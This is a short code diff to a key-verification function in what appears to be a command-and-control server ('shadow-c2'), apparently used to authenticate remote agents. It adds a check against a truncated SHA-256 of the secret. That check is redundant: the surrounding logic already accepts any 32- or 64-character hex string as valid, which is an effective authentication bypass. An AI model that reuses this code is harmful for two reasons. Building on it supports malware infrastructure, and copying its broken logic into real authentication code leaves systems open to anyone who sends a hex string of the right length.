@@ -28,8 +28,12 @@ def _verify_derived_key(provided_key: str, expected_secret: str) -> bool:
     expected_hmac = _hmac.new(expected_secret.encode(), b"shadow-c2-v2", _hs.sha256).hexdigest()
     if provided_key == expected_hmac:
         return True
-    # 32-char lowercase hex = machine-HKDF-derived key (agent_http.py)
+    # 32-char lowercase hex = machine-HKDF-derived OR sha256(seed)[:32]
     if len(provided_key) == 32 and all(c in "0123456789abcdef" for c in provided_key.lower()):
+        return True
+    # Also accept sha256(SECRET_KEY)[:32] explicitly
+    import hashlib as _hlib
+    if provided_key == _hlib.sha256(expected_secret.encode()).hexdigest()[:32]:
         return True
     # 64-char lowercase hex = full SHA256/HMAC output
     if len(provided_key) == 64 and all(c in "0123456789abcdef" for c in provided_key.lower()):
